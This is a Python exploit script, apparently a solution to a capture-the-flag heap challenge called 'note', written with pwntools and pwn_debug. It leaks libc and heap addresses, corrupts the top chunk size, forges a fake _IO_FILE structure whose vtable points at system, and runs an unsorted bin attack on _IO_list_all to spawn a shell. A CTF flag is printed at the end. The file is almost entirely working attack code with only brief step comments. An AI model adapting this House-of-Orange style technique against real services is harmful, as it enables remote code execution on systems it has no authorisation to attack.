# File: exp.py
# Author: raycp
# Date: 2019-05-15
# Description: exp for note

from pwn_debug.pwn_debug import *
from pwn_debug.IO_FILE_plus import *

pdbg=pwn_debug("note")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local()
pdbg.debug("2.23")
pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print type(pdbg.membp)
#print pdbg.hh
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

def new_note(size):
    p.recvuntil("-->>\n")
    p.sendline("1")
    p.recvuntil("size:")
    p.sendline(str(size))

def edit_note(data):
    p.recvuntil("-->>\n")
    p.sendline("3")
    p.recvuntil("tent:")
    p.send(data)

def delete_note():
    p.recvuntil("-->>\n")
    p.sendline("4")

def pwn():
    
    #pdbg.bp(0x400946)
    ## step 1 leaking libc and heap address
    new_note(0x200000)
    libc_base=int(p.recvuntil("\n")[:-1],16)-0x10+0x201000
    unsorted_addr=libc_base+libc.symbols['main_arena']+0x58
    system_addr=libc_base+libc.symbols['system']
    io_list_all=libc_base+libc.symbols["_IO_list_all"]
    log.info("leaking libc base: %s"%hex(libc_base))
    delete_note()

    #pdbg.bp([0x4009aa,0x400946])
    new_note(0x2f0)
    heap_base=int(p.recvuntil("\n")[:-1],16)-0x10
    #unsorted_addr=libc_base+libc.symbols['main_arena']+0x58
    
    log.info("leaking heap base: %s"%hex(heap_base))

    ## step 2 overwrite top chunk size
    edit_note('a'*0x2f8+p64(0xd01)+'\n')
    delete_note()

    ## step 3 trigger sysmalloc to get unsorted bin 
    new_note(0x1000)
    delete_note()

    #pdbg.bp([0x400946,0x4009ee,0x4009aa])
    
    ## step 4 overwrite previnuse bit of next chunk to avoid merge
    new_note(0x2f0)
    edit_note('a'*0x2f8+p64(0xce1)+p64(unsorted_addr)*2+"a"*0xcc0+p64(0)+p64(0x11)+'\n')

    delete_note()
    #pdbg.bp(0x400946)
    new_note(0x3f0)

    delete_note()

    ## step 5 build fake chunk and overwrite to prepare unsorted bin attack
    new_note(0x2f0)

    data='a'*0x2f0+p64(0)+p64(0x401)+p64(heap_base+0x300+0x400)+p64(unsorted_addr)+'a'*(0x3f0-0x10)
    fake_file=IO_FILE_plus()
    fake_file._IO_write_ptr=1
    fake_file._IO_write_base=0
   
    print hex(len(str(fake_file))),hex(fake_file.size)
    fake_vatble=fake_file.size+heap_base+0x300+0x400
    fake_file.vtable=fake_vatble
    fake_file.show()
    fake_file.orange_check()
    payload=str(fake_file)+p64(system_addr)*0x20

    fake_chunk='/bin/sh\x00'+p64(0x61)+p64(unsorted_addr)+p64(io_list_all-0x10)+payload[0x20:]
    data+=fake_chunk
    edit_note(data+'\n')

    delete_note()
    #new_note(0x2f0)
    #pdbg.bp(0x400946)

    ## step 6 trigger unsorted bin attack and flush to get shell
    p.sendline('1')
    p.sendline('777')
    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()

#*CTF{LtMh5VbedHlngmKOS2cwWRo4AkDGzCBy}

